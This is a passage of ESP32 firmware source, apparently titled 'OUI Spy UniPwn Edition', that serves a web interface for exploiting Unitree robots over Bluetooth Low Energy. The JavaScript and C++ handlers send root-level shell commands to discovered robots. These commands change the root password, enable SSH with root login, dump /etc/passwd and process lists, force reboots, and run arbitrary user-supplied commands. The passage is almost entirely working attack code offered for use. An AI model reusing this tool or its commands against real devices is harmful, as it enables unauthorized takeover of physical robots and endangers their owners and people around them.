                                    method: 'ssid'
                                })
                            });
                            
                            if (!sshResponse.ok) {
                                const errorText = await sshResponse.text();
                                throw new Error('SSH enable failed: HTTP ' + sshResponse.status + ' - ' + errorText);
                            }
                            
                            const sshResult = await sshResponse.json();
                            if (!sshResult.success) {
                                throw new Error('SSH enable rejected: ' + (sshResult.error || 'Service control failed'));
                            }
                            
                            addLog('SSH daemon ENABLED - Remote access now available', 'success');
                            return true;
                            
                        case 5: // Root Access
                            addLog('Compromising root account...', 'info');
                            const rootCommand = 'echo "root:pwned123" | chpasswd && echo "ROOT_PWNED_$(date +%s)" >> /tmp/unipwn.log && passwd -u root';
                            
                            const rootResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    address: selectedDevice.address,
                                    command: rootCommand,
                                    method: 'ssid'
                                })
                            });
                            
                            if (!rootResponse.ok) {
                                const errorText = await rootResponse.text();
                                throw new Error('Root compromise failed: HTTP ' + rootResponse.status + ' - ' + errorText);
                            }
                            
                            const rootResult = await rootResponse.json();
                            if (!rootResult.success) {
                                throw new Error('Root access denied: ' + (rootResult.error || 'Password change failed'));
                            }
                            
                            addLog('ROOT ACCESS GAINED - Password changed to: pwned123', 'success');
                            return true;
                            
                        case 6: // System Extract
                            addLog('Extracting critical system information...', 'info');
                            const extractCommand = 'uname -a && cat /etc/passwd | head -10 && ps aux | head -10 && cat /tmp/unipwn.log 2>/dev/null || echo "No log found"';
                            
                            const extractResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    address: selectedDevice.address,
                                    command: extractCommand,
                                    method: 'ssid'
                                })
                            });
                            
                            if (!extractResponse.ok) {
                                const errorText = await extractResponse.text();
                                throw new Error('System extraction failed: HTTP ' + extractResponse.status + ' - ' + errorText);
                            }
                            
                            const extractResult = await extractResponse.json();
                            if (!extractResult.success) {
                                throw new Error('Information extraction failed: ' + (extractResult.error || 'Command execution failed'));
                            }
                            
                            addLog('SYSTEM EXTRACTION COMPLETE - Critical data harvested', 'success');
                            if (extractResult.output) {
                                addLog('Extracted data preview: ' + extractResult.output.substring(0, 200) + '...', 'info');
                            }
                            return true;
                            
                        default:
                            throw new Error('Unknown step index: ' + stepIndex);
                    }
                } catch (error) {
                    addLog('Step ' + stepName + ' failed (attempt ' + attempt + '/' + maxRetries + '): ' + error.message, 'error');
                    
                    if (attempt === maxRetries) {
                        throw new Error('Step failed after ' + maxRetries + ' attempts: ' + error.message);
                    }
                    
                    // Progressive backoff delay
                    await sleep(attempt * 1000);
                }
            }
            
            return false;
        }
        
        async function fetchWithTimeout(url, timeout, options = {}) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            try {
                const response = await fetch(url, {
                    ...options,
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                return response;
            } catch (error) {
                clearTimeout(timeoutId);
                if (error.name === 'AbortError') {
                    throw new Error('Request timeout after ' + timeout + 'ms');
                }
                throw error;
            }
        }
        
        function updateProgress(percent, text) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('progressText').textContent = percent + '% - ' + text;
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Hardware toggle functions
        function toggleBuzzer() {
            const buzzerEnabled = document.getElementById('buzzerEnabled').checked;
            fetch('/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'setting=buzzer&value=' + (buzzerEnabled ? '1' : '0')
            })
            .then(response => response.text())
            .then(data => {
                addLog('Buzzer ' + (buzzerEnabled ? 'enabled' : 'disabled'), 'success');
            })
            .catch(error => {
                addLog('Failed to toggle buzzer: ' + error, 'error');
            });
        }

        function toggleLED() {
            const ledEnabled = document.getElementById('ledEnabled').checked;
            fetch('/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'setting=led&value=' + (ledEnabled ? '1' : '0')
            })
            .then(response => response.text())
            .then(data => {
                addLog('LED feedback ' + (ledEnabled ? 'enabled' : 'disabled'), 'success');
            })
            .catch(error => {
                addLog('Failed to toggle LED: ' + error, 'error');
            });
        }

        // Initialize on load
        document.addEventListener('DOMContentLoaded', function() {
            // Page loaded, get system info
            
            addLog('OUI Spy UniPwn Edition - Based on github.com/Bin4ry/UniPwn research', 'info');
            addLog('Ready for Unitree robot BLE exploitation', 'info');
            getSystemInfo();
            setInterval(getSystemInfo, 10000);
        });
    </script>
</body>
</html>
)rawliteral";

// Web server handlers
void setASCIIBackground() {
    // This will be handled via JavaScript after page load
}

void handleRoot() {
    String fullHTML = String(webPageHTML);
    fullHTML.replace("<div class=\"ascii-background\"></div>", 
                     "<div class=\"ascii-background\">" + getASCIIArt() + "</div>");
    webServer.send(200, "text/html", fullHTML);
}

void handleScan() {
    Serial.println("[WEB] BLE scan requested");
    
    // Start actual BLE scan
    scanForDevices();
    
    // Build JSON response with real discovered devices
    String json = "{\"success\": true, \"devices\": [";
    
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"address\": \"" + discoveredDevices[i].address + "\",";
        json += "\"name\": \"" + discoveredDevices[i].name + "\",";
        json += "\"rssi\": " + String(discoveredDevices[i].rssi);
        json += "}";
    }
    
    json += "]}";
    webServer.send(200, "application/json", json);
}

void handleExploit() {
    if (webServer.method() != HTTP_POST) {
        webServer.send(405, "text/plain", "Method not allowed");
        return;
    }
    
    String body = webServer.arg("plain");
    Serial.println("[WEB] Exploit request: " + body);
    
    // Parse JSON request
    DynamicJsonDocument requestDoc(1024);
    deserializeJson(requestDoc, body);
    
    String targetAddress = requestDoc["target"];
    String command = requestDoc["command"];
    String method = requestDoc["method"];
    
    Serial.println("[WEB] Target: " + targetAddress);
    Serial.println("[WEB] Command: " + command);
    Serial.println("[WEB] Method: " + method);
    
    // Find target device in discovered list
    int targetIndex = -1;
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (discoveredDevices[i].address.equals(targetAddress)) {
            targetIndex = i;
            break;
        }
    }
    
    if (targetIndex == -1) {
        String json = R"({"success": false, "error": "Target device not found"})";
        webServer.send(400, "application/json", json);
        return;
    }
    
    // Execute real exploit
    bool success = false;
    
    if (command == "enable_ssh") {
        success = executeCommand(discoveredDevices[targetIndex], "/etc/init.d/ssh start");
    } else if (command == "change_root_pwd") {
        success = executeCommand(discoveredDevices[targetIndex], "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;");
    } else if (command == "reboot") {
        success = executeCommand(discoveredDevices[targetIndex], "reboot -f");
    } else {
        // Custom command
        success = executeCommand(discoveredDevices[targetIndex], command);
    }
    
    if (success) {
        String json = R"({"success": true, "message": "Exploit executed successfully"})";
        webServer.send(200, "application/json", json);
    } else {
        String json = R"({"success": false, "error": "Exploit execution failed"})";
        webServer.send(500, "application/json", json);
    }
}

void handleStatus() {
    String json = "{";
    json += "\"freeHeap\":" + String(ESP.getFreeHeap()) + ",";
    json += "\"uptime\":\"" + String(millis() / 1000) + "s\",";
    json += "\"wifiStatus\":\"" + String(WiFi.getMode() == WIFI_AP ? "AP Mode" : "STA Mode") + "\",";
    json += "\"bleStatus\":\"" + String(BLEDevice::getInitialized() ? "Active" : "Inactive") + "\",";
    json += "\"devicesFound\":" + String(discoveredDevices.size());
    json += "}";
    webServer.send(200, "application/json", json);
}

void handleNotFound() {
    webServer.send(404, "text/plain", "Page not found");
}

void handleToggle() {
    if (webServer.hasArg("setting") && webServer.hasArg("value")) {
        String setting = webServer.arg("setting");
        String value = webServer.arg("value");
        bool enabled = (value == "1");
        
        if (setting == "buzzer") {
            buzzerEnabled = enabled;
            Serial.println("Web: Buzzer " + String(enabled ? "enabled" : "disabled"));
            if (enabled) {
                // Test beep when enabled
                #if ENABLE_BUZZER
                singleBeep();
                #endif
            } else {
                // Stop any active buzzing when disabled
                #if ENABLE_BUZZER
                stopProximityBeep();
                ledcWrite(BUZZER_PIN, 0);
                #endif
            }
            saveConfiguration();
            webServer.send(200, "text/plain", "OK");
        } else if (setting == "led") {
            ledEnabled = enabled;
            Serial.println("Web: LED " + String(enabled ? "enabled" : "disabled"));
            if (enabled) {
                // Test blink when enabled
                #if ENABLE_LED_FEEDBACK
                ledBlink(200);
                #endif
            } else {
                // Turn off LED when disabled
                #if ENABLE_LED_FEEDBACK
                stopProximityLED();
                digitalWrite(LED_PIN, HIGH);  // HIGH = OFF (inverted logic)
                #endif
            }
            saveConfiguration();
            webServer.send(200, "text/plain", "OK");
        } else {
            webServer.send(400, "text/plain", "Invalid setting");
        }
    } else {
        webServer.send(400, "text/plain", "Missing parameters");
    }
}

void setupWebInterface() {
    // Set up access point
    WiFi.mode(WIFI_AP);
    WiFi.softAP(WIFI_AP_SSID, WIFI_AP_PASSWORD);
    
    // Setup DNS server for captive portal
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    // Setup web server routes
    webServer.on("/", handleRoot);
    webServer.on("/scan", HTTP_POST, handleScan);
    webServer.on("/exploit", HTTP_POST, handleExploit);
    webServer.on("/status", handleStatus);
    webServer.on("/toggle", HTTP_POST, handleToggle);
    webServer.onNotFound(handleNotFound);
    
    // Start web server
    webServer.begin();
    
    Serial.println("=== OUI SPY UNIPWN WEB INTERFACE ACTIVE ===");
    Serial.println("SSID: " + String(WIFI_AP_SSID));
    Serial.println("Password: " + String(WIFI_AP_PASSWORD));
    Serial.println("URL: http://192.168.4.1");
    Serial.println("===========================================");
}

void handleWebInterface() {
    dnsServer.processNextRequest();
    webServer.handleClient();
}

#endif // ENABLE_WEB_INTERFACE